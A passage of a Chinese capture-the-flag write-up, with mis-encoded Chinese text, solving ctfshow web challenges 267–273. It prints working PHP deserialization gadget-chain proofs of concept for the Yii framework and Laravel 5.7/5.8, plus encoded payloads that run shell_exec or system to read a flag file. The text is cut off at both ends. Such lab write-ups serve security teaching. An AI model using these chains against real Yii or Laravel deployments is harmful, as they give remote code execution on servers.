punctuation">&#125;</span></code></pre><h4 id="web267-YiiÊ°ÜÊû∂"><a href="#web267-YiiÊ°ÜÊû∂" class="headerlink" title="web267(YiiÊ°ÜÊû∂)"></a>web267(YiiÊ°ÜÊû∂)</h4><p>Âº±ÂØÜÁ†Å<code>admin/admin</code>ÁôªÈôÜÂêéÔºåAboutÁïåÈù¢ÂèëÁé∞Ê≥®Èáä<code>&lt;!--?view-source --&gt;</code></p><p>‰∫éÊòØËÆøÈóÆ<code>index.php?r=site/about&amp;view-source</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token comment">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Êêú‰∫Ü‰∏Ä‰∏ãÁü•ÈÅìÊòØ <code>Yii</code> Ê°ÜÊû∂ÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p><p><a href="https://www.cnblogs.com/thresh/p/13743081.html">YiiÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê</a></p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cp /flag 3.txt'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ËøôÈáå <code>system</code> ‰∏çËÉΩÁî®ÔºåÁî®‰∫Ü <code>shell_exec</code>„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">%</span><span class="token number">2</span>Fshell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGFnIDMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h4 id="web268-270-YiiÊ°ÜÊû∂"><a href="#web268-270-YiiÊ°ÜÊû∂" class="headerlink" title="web268-270(YiiÊ°ÜÊû∂)"></a>web268-270(YiiÊ°ÜÊû∂)</h4><p>ÂÅöÊ≥ï‰∏ÄÊ†∑‰ΩÜÊòØÈúÄË¶Å‰øÆÊîπpocÔºåÂõ†‰∏∫Â≠òÂú®ËøáÊª§ </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Action</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Ê≠§Â§ÑÂÜôÂëΩ‰ª§</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span></code></pre><h4 id="web271-Laravel5-7-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#web271-Laravel5-7-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="web271(Laravel5.7 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)"></a>web271(Laravel5.7 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)</h4><p><a href="https://blog.csdn.net/weixin_45678034/article/details/122292624">Laravel5.7ÂèçÂ∫èÂàóÂåñRCEÊºèÊ¥ûÂàÜÊûê</a></p><p>Á©∫Ê†ºË¢´ËøáÊª§Ê≥®ÊÑè‰øÆÊîπÊúÄÂêéÁöÑpayload</p><p>Poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span><span class="token variable">$class</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span><span class="token operator">=</span><span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">attributes</span> <span class="token operator">=</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"expectedOutput"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"expectedQuestions"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=></span>                <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string double-quoted-string">"concrete"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Illuminate\Foundation\Application"</span>                     <span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /fl*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$genericuser</span><span class="token punctuation">,</span>        <span class="token variable">$application</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÊàñËÄÖ‰ΩøÁî®phpgcc<code>php  phpggc Laravel/RCE6 &quot;system(&#39;cat /flag&#39;);&quot; --url</code></p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A44<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CTesting<span class="token operator">%</span><span class="token number">5</span>CPendingCommand<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>command<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>parameters<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span><span class="token operator">%</span><span class="token number">2</span>Ffl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>app<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A22<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>hasBeenBootstrapped<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>bindings<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CContracts<span class="token operator">%</span><span class="token number">5</span>CConsole<span class="token operator">%</span><span class="token number">5</span>CKernel<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>concrete<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A27<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CAuth<span class="token operator">%</span><span class="token number">5</span>CGenericUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>attributes<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedOutput<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedQuestions<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web272-273-Laravel5-8-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û"><a href="#web272-273-Laravel5-8-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û" class="headerlink" title="web272-273(Laravel5.8 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)"></a>web272-273(Laravel5.8 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Line</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token 